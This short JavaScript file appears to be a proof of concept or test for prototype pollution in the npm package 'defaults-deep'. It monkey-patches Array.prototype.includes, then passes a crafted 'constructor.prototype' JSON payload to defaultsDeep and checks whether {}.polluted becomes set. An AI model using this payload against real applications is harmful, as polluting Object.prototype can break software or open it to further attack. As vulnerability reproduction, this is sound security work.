Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const defaultsDeep = require('defaults-deep');
console.log({}.polluted);
let malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
defaultsDeep({}, JSON.parse(malicious_payload));
console.log({}.polluted);